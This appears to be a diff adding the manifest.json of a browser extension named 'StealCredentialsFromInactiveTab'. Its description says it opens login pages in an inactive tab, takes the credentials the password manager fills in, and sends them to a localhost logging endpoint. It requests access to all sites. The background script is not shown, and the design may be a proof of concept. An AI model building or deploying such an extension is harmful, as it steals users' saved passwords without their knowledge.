@@ -1,0 +1,17 @@
+{ 
+    "manifest_version": 2,
+
+    "name": "StealCredentialsFromInactiveTab",
+    "description": "Extension that steals the data from an login form if the browser's password manager has filled in the credentials. Sends data to http://localhost:3000/log. Explicitly opens login web pages in an inactive tab." ,
+    "version": "1.0",
+	
+	"background": {
+		"scripts": ["background.js"]
+	},
+	
+	"permissions": [
+		"tabs",
+		"https://*/*",
+		"http://*/*"
+	]
+}
